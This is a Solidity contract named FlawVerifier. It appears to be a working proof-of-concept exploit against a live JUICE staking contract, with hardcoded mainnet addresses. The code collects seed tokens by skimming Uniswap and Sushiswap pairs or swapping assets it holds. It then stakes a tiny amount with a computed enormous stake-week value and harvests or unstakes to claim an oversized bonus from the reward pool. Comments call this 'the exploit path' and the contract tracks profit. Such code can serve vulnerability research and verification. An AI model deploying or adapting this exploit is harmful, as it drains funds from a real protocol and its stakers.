// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IJuiceStaking {
    function Juice() external view returns (address);
    function JuiceStaked() external view returns (uint256);
    function rewardPerSecond() external view returns (uint256);
    function stake(uint256 amount, uint256 stakeWeek) external;
    function harvest(uint256 stakeCount) external;
    function unstake(uint256 stakeCount) external;
    function pendingReward(address staker, uint256 stakeCount) external view returns (uint256 pending, uint256 bonus);
    function stakingStartTime() external view returns (uint256);
    function stakingEndTime() external view returns (uint256);
    function stakingCount(address staker) external view returns (uint256);
    function mapStakingInfo(address staker, uint256 stakeCount)
        external
        view
        returns (
            uint256 stakedAmount,
            uint256 startTime,
            uint256 endTime,
            uint256 stakingWeek,
            uint256 rewardDebt,
            uint256 unstakeStatus
        );
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    IJuiceStaking internal constant STAKING =
        IJuiceStaking(address(uint160(0x8584DdbD1E28bCA4bc6Fb96baFe39f850301940e)));

    address internal constant JUICE = 0xdE5d2530A877871F6f0fc240b9fCE117246DaDae;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    uint256 internal constant CONSERVATIVE_PENDING_HORIZON = 1;
    uint256 internal constant MIN_TARGET_PROFIT = 2e15;
    uint256 internal constant MAX_REASONABLE_HUGE_STAKE_WEEK = 1e30;

    uint256 internal baselineBalance;
    uint256 internal trackedStakeCount;
    uint256 internal trackedStakeEndTime;
    bool internal baselineSet;
    bool internal stakeOpened;

    constructor() payable {
        _bootstrapExploitPosition();
    }

    receive() external payable {}

    function executeOnOpportunity() external payable {
        if (!stakeOpened) {
            _bootstrapExploitPosition();
        }

        _tryRealizeExploitProfit();
    }

    function profitToken() external pure returns (address) {
        return JUICE;
    }

    function profitAmount() external view returns (uint256) {
        if (!baselineSet) {
            return 0;
        }

        uint256 currentBalance = IERC20Minimal(JUICE).balanceOf(address(this));
        if (currentBalance <= baselineBalance) {
            return 0;
        }

        return currentBalance - baselineBalance;
    }

    function _bootstrapExploitPosition() internal {
        if (stakeOpened) {
            return;
        }

        uint256 stakingStart = STAKING.stakingStartTime();
        if (stakingStart == 0) {
            return;
        }

        uint256 stakingEnd = STAKING.stakingEndTime();
        if (stakingEnd <= block.timestamp) {
            return;
        }

        uint256 rewardRate = STAKING.rewardPerSecond();
        if (rewardRate == 0) {
            return;
        }

        uint256 verifierHeldJuice = _ensurePermanentSeedJuice();
        if (verifierHeldJuice == 0) {
            return;
        }

        uint256 tinyAmount = verifierHeldJuice;
        uint256 currentTotalStaked = STAKING.JuiceStaked();
        uint256 poolBalance = IERC20Minimal(JUICE).balanceOf(address(STAKING));
        uint256 hugeStakeWeek =
            _chooseHugeStakeWeek(tinyAmount, currentTotalStaked, rewardRate, poolBalance, block.timestamp);

        trackedStakeCount = STAKING.stakingCount(address(this));
        if (!_forceApprove(JUICE, address(STAKING), tinyAmount)) {
            return;
        }

        // The exploit path itself is unchanged:
        // 1. acquire a tiny real JUICE amount and call stake(tinyAmount, hugeStakeWeek) while staking is open.
        // 2. after base reward accrues, harvest() or unstake() realizes the oversized bonus.
        //
        // A V2 flashswap cannot leave a persistent funded stake across deployment -> execute(), because the pair
        // must be repaid atomically in the same transaction. The realistic public substitute here is collecting
        // excess JUICE or swappable dust from live JUICE V2 pools via skim(), then using that permanent seed.
        try STAKING.stake(tinyAmount, hugeStakeWeek) {
            baselineBalance = IERC20Minimal(JUICE).balanceOf(address(this));
            baselineSet = true;
            (, , trackedStakeEndTime, , , ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);
            stakeOpened = true;
        } catch {}
    }

    function _tryRealizeExploitProfit() internal {
        if (!stakeOpened) {
            return;
        }

        (
            uint256 stakedAmount,
            ,
            uint256 endTime,
            ,
            ,
            uint256 unstakeStatus
        ) = STAKING.mapStakingInfo(address(this), trackedStakeCount);

        if (stakedAmount == 0 || unstakeStatus != 0) {
            return;
        }

        (uint256 pending, ) = STAKING.pendingReward(address(this), trackedStakeCount);
        if (pending == 0) {
            return;
        }

        if (block.timestamp >= endTime || block.timestamp >= trackedStakeEndTime) {
            try STAKING.unstake(trackedStakeCount) {} catch {}
        } else {
            try STAKING.harvest(trackedStakeCount) {} catch {}
        }
    }

    function _ensurePermanentSeedJuice() internal returns (uint256 verifierHeldJuice) {
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _collectPoolDust(UNISWAP_V2_FACTORY);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _collectPoolDust(SUSHISWAP_FACTORY);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(WETH);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(USDC);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(USDT);
        verifierHeldJuice = IERC20Minimal(JUICE).balanceOf(address(this));
        if (verifierHeldJuice != 0) {
            return verifierHeldJuice;
        }

        _tryAcquireJuiceFromHeldAsset(DAI);
        return IERC20Minimal(JUICE).balanceOf(address(this));
    }

    function _collectPoolDust(address factory) internal {
        address[4] memory quotes = [WETH, USDC, USDT, DAI];

        for (uint256 i = 0; i < quotes.length; ++i) {
            address pair = IUniswapV2FactoryLike(factory).getPair(JUICE, quotes[i]);
            if (pair == address(0)) {
                continue;
            }

            try IUniswapV2PairLike(pair).skim(address(this)) {} catch {}
        }
    }

    function _tryAcquireJuiceFromHeldAsset(address tokenIn) internal {
        uint256 balance = IERC20Minimal(tokenIn).balanceOf(address(this));
        if (balance == 0) {
            return;
        }

        if (_tryV2Swap(tokenIn, JUICE, balance, UNISWAP_V2_ROUTER)) {
            return;
        }

        if (_tryV2Swap(tokenIn, JUICE, balance, SUSHISWAP_ROUTER)) {
            return;
        }

        if (tokenIn != WETH) {
            if (_tryV2SwapViaWeth(tokenIn, balance, UNISWAP_V2_ROUTER)) {
                return;
            }

            _tryV2SwapViaWeth(tokenIn, balance, SUSHISWAP_ROUTER);
        }
    }

    function _tryV2Swap(address tokenIn, address tokenOut, uint256 amountIn, address router) internal returns (bool) {
        if (!_forceApprove(tokenIn, router, amountIn)) {
            return false;
        }

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {
            return IERC20Minimal(tokenOut).balanceOf(address(this)) != 0;
        } catch {
            return false;
        }
    }

    function _tryV2SwapViaWeth(address tokenIn, uint256 amountIn, address router) internal returns (bool) {
        if (!_forceApprove(tokenIn, router, amountIn)) {
            return false;
        }

        address[] memory path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = JUICE;

        try IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        ) {
            return IERC20Minimal(JUICE).balanceOf(address(this)) != 0;
        } catch {
            return false;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        uint256 currentAllowance = IERC20Minimal(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return true;
        }

        if (_callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount))) {
            return true;
        }

        if (!_callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0))) {
            return false;
        }

        return _callOptionalReturn(token, abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        return success && (returndata.length == 0 || abi.decode(returndata, (bool)));
    }

    function _chooseHugeStakeWeek(
        uint256 tinyAmount,
        uint256 currentTotalStaked,
        uint256 rewardRate,
        uint256 poolBalance,
        uint256 currentTime
    ) internal pure returns (uint256 hugeStakeWeek) {
        uint256 expectedPending = rewardRate * CONSERVATIVE_PENDING_HORIZON;
        expectedPending = (expectedPending * tinyAmount) / (currentTotalStaked + tinyAmount);
        if (expectedPending == 0) {
            expectedPending = 1;
        }

        uint256 desiredPayout = poolBalance / 10_000;
        if (desiredPayout < MIN_TARGET_PROFIT) {
            desiredPayout = MIN_TARGET_PROFIT;
        }

        uint256 maxConservativePayout = poolBalance / 20;
        if (maxConservativePayout != 0 && desiredPayout > maxConservativePayout) {
            desiredPayout = maxConservativePayout;
        }

        if (desiredPayout <= expectedPending) {
            hugeStakeWeek = 2;
        } else {
            uint256 bonusTarget = desiredPayout - expectedPending;
            hugeStakeWeek = ((bonusTarget * 100) / (expectedPending * 9)) + 1;
            if (hugeStakeWeek < 2) {
                hugeStakeWeek = 2;
            }
        }

        uint256 maxFromStakeEnd = (type(uint256).max - currentTime) / 7 days;
        uint256 maxFromBonusMath = type(uint256).max / (expectedPending * 9);
        uint256 safeUpperBound = maxFromStakeEnd;

        if (safeUpperBound > maxFromBonusMath) {
            safeUpperBound = maxFromBonusMath;
        }
        if (safeUpperBound > MAX_REASONABLE_HUGE_STAKE_WEEK) {
            safeUpperBound = MAX_REASONABLE_HUGE_STAKE_WEEK;
        }
        if (safeUpperBound < 2) {
            safeUpperBound = 2;
        }

        if (hugeStakeWeek > safeUpperBound) {
            hugeStakeWeek = safeUpperBound;
        }
    }
}
